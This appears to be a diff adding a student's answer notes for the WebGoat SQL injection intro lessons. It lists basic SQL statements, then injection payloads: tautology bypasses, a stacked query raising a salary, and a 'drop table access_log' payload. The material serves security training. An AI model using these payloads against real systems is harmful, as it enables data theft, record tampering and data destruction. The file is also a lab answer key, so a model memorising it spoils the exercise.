@@ -1,0 +1,14 @@
+Source code of the WebGoat - SQL Injection intro:--
+
+1. select department from employees where first_name='Bob'         ---> Retrieving the database information of the user(Bob)
+2. update employees set department='Sales' where first_name='Tobi' ---> Updating the database information
+3. alter table employees add phone varchar(20)                     ---> Alter/manipulating the database by adding phone column
+4. GRANT SELECT, INSERT, UPDATE, DELETE ON grant_rights 
+TO unauthorized_user;                                              ---> granting all access rights to the table
+5. select * from user_data where first_name='John' and 
+last_name='Smith' OR '1'='1                                        ---> getting the entries of the user(smith) if matches with the DB table
+6. login count 10, user_id = user or 1=1                           ---> using two input fields, we are retrieving all the database entries
+7. Smith' or 1=1--                                                 ---> confidentiality violation
+8. empl name: Smith | 3SL99A'; UPDATE employees SET salary=999999 
+WHERE last_name='Smith' --                                         ---> integrity violation
+9. update';drop table access_log --                                ---> availability violation
